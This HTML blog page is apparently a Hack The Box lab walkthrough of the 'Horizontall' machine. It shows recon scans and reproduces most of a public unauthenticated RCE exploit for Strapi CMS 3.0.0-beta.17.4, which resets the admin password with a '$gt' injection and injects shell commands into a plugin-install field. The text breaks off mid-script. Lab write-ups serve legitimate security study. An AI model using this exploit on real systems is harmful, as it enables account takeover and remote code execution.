

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="World&#39;sEnd">
  <meta name="keywords" content="">
  
    <meta name="description" content="Recon：12345Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-17 03:37:03 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports&#x2F;host]Discovered open port 22&#x2F;tcp on 10.10.11.105Discovered">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB Walkthrough - Horizontall">
<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Horizontall.html">
<meta property="og:site_name" content="Network Security Notes">
<meta property="og:description" content="Recon：12345Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-17 03:37:03 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports&#x2F;host]Discovered open port 22&#x2F;tcp on 10.10.11.105Discovered">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517114731091.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517121856344.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517122249151.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517123453787.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517132208419.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517135837450.png">
<meta property="article:published_time" content="2023-08-13T22:39:09.013Z">
<meta property="article:modified_time" content="2023-08-13T19:37:09.304Z">
<meta property="article:author" content="World&#39;sEnd">
<meta property="article:tag" content="Linux">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517114731091.png">
  
  
  
  <title>HTB Walkthrough - Horizontall - Network Security Notes</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HTB Walkthrough - Horizontall"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-08-14 06:39" pubdate>
          August 14, 2023 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          19k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          155 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">HTB Walkthrough - Horizontall</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-17 03:37:03 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 22/tcp on 10.10.11.105</span><br><span class="line">Discovered open port 80/tcp on 10.10.11.105 </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> horizontall.htb (10.10.11.105)</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:<span class="built_in">cd</span>:ff:6b:0d:d5 (RSA)</span><br><span class="line">|   256 3a:d5:89:d5:da:95:59:d9:<span class="built_in">df</span>:01:68:37:ca:d5:10:b0 (ECDSA)</span><br><span class="line">|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://horizontall.htb</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 19.16 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; whatweb http://horizontall.htb</span><br><span class="line"></span><br><span class="line">http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]</span><br></pre></td></tr></table></figure>

<p>页面没有任何内容，所见非真：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517114731091.png" srcset="/img/loading.gif" lazyload alt="image-20220517114731091"  />

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; dirsearch -u http://horizontall.htb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/mosaictheory/.dirsearch/reports/horizontall.htb/_22-05-17_11-43-09.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/mosaictheory/.dirsearch/logs/errors-22-05-17_11-43-09.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">Target: http://horizontall.htb/</span><br><span class="line"></span><br><span class="line">[11:43:10] Starting: </span><br><span class="line">[11:43:12] 301 -  194B  - /js  -&gt;  http://horizontall.htb/js/</span><br><span class="line">[11:43:51] 301 -  194B  - /css  -&gt;  http://horizontall.htb/css/</span><br><span class="line">[11:43:56] 200 -    4KB - /favicon.ico</span><br><span class="line">[11:44:01] 301 -  194B  - /img  -&gt;  http://horizontall.htb/img/</span><br><span class="line">[11:44:02] 200 -  901B  - /index.html</span><br><span class="line">[11:44:03] 403 -  580B  - /js/</span><br></pre></td></tr></table></figure>

<p>这个站点像是一个谎言，我应该寻找其他站点：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; gobuster vhost -u http://horizontall.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t200</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:          http://horizontall.htb/</span><br><span class="line">[+] Method:       GET</span><br><span class="line">[+] Threads:      200</span><br><span class="line">[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span><br><span class="line">[+] User Agent:   gobuster/3.1.0</span><br><span class="line">[+] Timeout:      10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/05/17 12:09:46 Starting gobuster <span class="keyword">in</span> VHOST enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Found: api-prod.horizontall.htb (Status: 200) [Size: 413]</span><br><span class="line">                                                         </span><br><span class="line">===============================================================</span><br><span class="line">2022/05/17 12:11:17 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; whatweb http://api-prod.horizontall.htb/                                                                                                    </span><br><span class="line">http://api-prod.horizontall.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Strict-Transport-Security[max-age=31536000; includeSubDomains], Title[Welcome to your API], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[Strapi &lt;strapi.io&gt;], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.14.0]</span><br></pre></td></tr></table></figure>

<p>Strapi cms.页面也很简单，只有一条欢迎语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl http://api-prod.horizontall.htb/</span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to your API<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; dirsearch -u http://api-prod.horizontall.htb</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/mosaictheory/.dirsearch/reports/api-prod.horizontall.htb/_22-05-17_12-15-04.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/mosaictheory/.dirsearch/logs/errors-22-05-17_12-15-04.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">Target: http://api-prod.horizontall.htb/</span><br><span class="line"></span><br><span class="line">[12:15:04] Starting: </span><br><span class="line">[12:15:18] 200 -  854B  - /ADMIN</span><br><span class="line">[12:15:18] 200 -  854B  - /Admin</span><br><span class="line">[12:15:18] 200 -  854B  - /Admin/login/</span><br><span class="line">[12:15:23] 400 -   67B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[12:15:53] 200 -    1KB - /favicon.ico</span><br><span class="line">[12:15:58] 200 -  413B  - /index.html</span><br><span class="line">[12:16:17] 200 -  121B  - /robots.txt</span><br><span class="line">[12:16:17] 200 -  507B  - /reviews</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517121856344.png" srcset="/img/loading.gif" lazyload alt="image-20220517121856344"  />

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517122249151.png" srcset="/img/loading.gif" lazyload alt="image-20220517122249151"  />

<p>我需要想方法获取Strapi的版本，在源码中会有这么一串提示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A lot of magic happens <span class="keyword">in</span> this file. HtmlWebpackPlugin automatically includes all assets (e.g. bundle.js, main.css) with the correct HTML tags, <span class="built_in">which</span> is why they are missing <span class="keyword">in</span> this HTML file. Don<span class="string">&#x27;t add any assets here! (Check out webpackconfig.js if you want to know more)  </span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517123453787.png" srcset="/img/loading.gif" lazyload alt="image-20220517123453787"  />

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; searchsploit strapi 3.0.0-beta.17.4</span><br><span class="line">--------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                             |  Path</span><br><span class="line">--------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py</span><br><span class="line">Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)   | nodejs/webapps/50716.rb</span><br><span class="line">--------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br><span class="line">&gt;&gt; searchsploit -m multiple/webapps/50239.py</span><br><span class="line">  Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/50239</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py</span><br><span class="line">File Type: Python script, ASCII text executable</span><br><span class="line"></span><br><span class="line">Copied to: /home/mosaictheory/50239.py</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)</span></span><br><span class="line"><span class="comment"># Date: 2021-08-30</span></span><br><span class="line"><span class="comment"># Exploit Author: Musyoka Ian</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://strapi.io/</span></span><br><span class="line"><span class="comment"># Software Link: https://strapi.io/</span></span><br><span class="line"><span class="comment"># Version: Strapi CMS version 3.0.0-beta.17.4 or lower</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 20.04</span></span><br><span class="line"><span class="comment"># CVE : CVE-2019-18818, CVE-2019-19609</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> cmd <span class="keyword">import</span> Cmd</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Wrong number of arguments provided&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Usage: python3 exploit.py &lt;URL&gt;\n&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Terminal</span>(<span class="title class_ inherited__">Cmd</span>):</span><br><span class="line">    prompt = <span class="string">&quot;$&gt; &quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">default</span>(<span class="params">self, args</span>):</span><br><span class="line">        code_exec(args)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_version</span>():</span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Checking Strapi CMS Version running&quot;</span>)</span><br><span class="line">    version = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/init&quot;</span>).text</span><br><span class="line">    version = json.loads(version)</span><br><span class="line">    version = version[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;strapiVersion&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> version == <span class="string">&quot;3.0.0-beta.17.4&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Version mismatch trying the exploit anyway&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password_reset</span>():</span><br><span class="line">    <span class="keyword">global</span> url, jwt</span><br><span class="line">    session = requests.session()</span><br><span class="line">    params = &#123;<span class="string">&quot;code&quot;</span> : &#123;<span class="string">&quot;$gt&quot;</span>:<span class="number">0</span>&#125;,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="string">&quot;SuperStrongPassword1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwordConfirmation&quot;</span> : <span class="string">&quot;SuperStrongPassword1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">    output = session.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/auth/reset-password&quot;</span>, json = params).text</span><br><span class="line">    response = json.loads(output)</span><br><span class="line">    jwt = response[<span class="string">&quot;jwt&quot;</span>]</span><br><span class="line">    username = response[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    email = response[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;email&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;jwt&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Password reset unsuccessfull\n[-] Exiting now\n\n&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Password reset was successfully\n[+] Your email is: <span class="subst">&#123;email&#125;</span>\n[+] Your new credentials are: <span class="subst">&#123;username&#125;</span>:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: <span class="subst">&#123;jwt&#125;</span>\n\n&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code_exec</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">global</span> jwt, url</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don&#x27;t expect to see output&quot;</span>)</span><br><span class="line">    headers = &#123;<span class="string">&quot;Authorization&quot;</span> : <span class="string">f&quot;Bearer <span class="subst">&#123;jwt&#125;</span>&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;plugin&quot;</span> : <span class="string">f&quot;documentation &amp;&amp; $(<span class="subst">&#123;cmd&#125;</span>)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;port&quot;</span> : <span class="string">&quot;1337&quot;</span>&#125;</span><br><span class="line">    out = requests.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/plugins/install&quot;</span>, json = data, headers = headers)</span><br><span class="line">    <span 